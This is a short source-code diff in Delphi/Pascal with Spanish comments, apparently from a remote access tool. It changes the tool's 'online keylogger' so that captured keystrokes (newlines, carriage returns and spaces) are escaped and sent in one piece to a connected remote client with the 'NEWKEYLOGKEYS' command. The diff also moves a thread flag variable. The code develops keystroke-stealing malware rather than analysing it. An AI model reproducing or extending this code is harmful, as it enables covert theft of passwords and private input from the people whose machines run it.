@@ -16,8 +16,9 @@ uses
   classes,
   Sysutils;
 
-
-  
+var
+  ThreadStarted        : boolean;
+    
 type
   USHORT = Word;
 
@@ -162,7 +163,6 @@ var
   TeclasPulsadas       : string;  //teclas pulsadas, se eliminan al guardar el log
   lasttickcount        : integer; //última vez guardado
   lasttickcountv       : integer; //última vez guardado
-  ThreadStarted        : boolean;
   id1                  : longword;
   id2                  : longword;
   Evento               : string;
@@ -357,6 +357,9 @@ begin
         lasttickcounton := GetTickCount();
           if(OnlineKeyloggerKeys <> '') then //Teclas nuevas del online keylogger :D
           begin
+             OnlineKeyloggerKeys:= StringReplace(OnlineKeyloggerKeys,#10, '|salto|', [rfReplaceAll]);   //Para que lo envie todo de una vez
+            OnlineKeyloggerKeys := StringReplace(OnlineKeyloggerKeys,#13, '|salto2|', [rfReplaceAll]);
+            OnlineKeyloggerKeys := StringReplace(OnlineKeyloggerKeys,' ', '|espacio|', [rfReplaceAll]); //Para evitar el trim( final
             if(Cliente.Connected) then
               Cliente.SendString('NEWKEYLOGKEYS|'+OnlineKeyloggerKeys+ ENTER)
             else
